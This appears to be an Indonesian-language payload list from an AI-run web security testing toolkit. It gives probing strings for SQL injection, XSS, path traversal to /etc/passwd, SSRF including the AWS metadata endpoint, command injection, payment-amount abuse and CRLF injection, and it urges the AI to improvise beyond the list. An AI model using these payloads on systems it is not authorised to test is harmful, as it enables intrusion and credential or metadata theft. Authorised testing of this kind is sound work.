# Payload Library (starting point, BUKAN batas)

Ini titik mulai buat baseline coverage cepat per kategori. AI BEBAS dan
DIANJURIN improvisasi di luar daftar ini kalau kondisi yang ditemuin minta
pendekatan lain — lihat methodology.md bagian "Lapis 2". Daftar di sini
cuma starting point, bukan satu-satunya sumber.

INGAT: payload dari mana pun (sini atau improvisasi) TETEP harus
nghasilin bukti request+response nyata sebelum bisa diklaim jadi temuan
(evidence-rules.md).

## SQL Injection (probing awal, non-destruktif)
```
'
''
' OR '1'='1
' OR '1'='1' --
1' AND SLEEP(3)--
1) AND SLEEP(3)--
```
Reaksi buat diamati: error message yang leak struktur query, response
time yang beda signifikan (indikasi time-based blind), perubahan jumlah
data yang balik.

## XSS (probing reflected/stored, non-destruktif — pakai alert non-invasif)
```
<script>alert(1)</script>
"><script>alert(1)</script>
<img src=x onerror=alert(1)>
javascript:alert(1)
```
Reaksi: payload muncul balik di response TANPA di-escape (`<` jadi `&lt;`
itu berarti udah di-escape/aman).

## Path Traversal
```
../../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
....//....//etc/passwd
```

## SSRF (kalau ada fitur nerima URL dari user)
```
http://127.0.0.1/
http://localhost/
http://169.254.169.254/latest/meta-data/    (AWS metadata endpoint)
http://[::1]/
```

## Command Injection (probing non-destruktif)
```
; whoami
| whoami
`whoami`
$(whoami)
```
HATI-HATI: kategori ini paling beresiko efek samping, cuma coba yang
read-only (whoami, id, pwd) — JANGAN pernah coba payload yang destructive
(rm, dll) meski mode --allow-mutating aktif.

## Business logic (top-up/payment — lihat payment-gaming-checks.md buat
konteks lengkap, ini cuma daftar nilai starting point)
```
amount = -1
amount = 0
amount = 0.001
amount = 999999999999
quantity = -1
```

## Header injection / CRLF
```
%0d%0aSet-Cookie: injected=true
%0d%0a%0d%0a<html>injected</html>
```
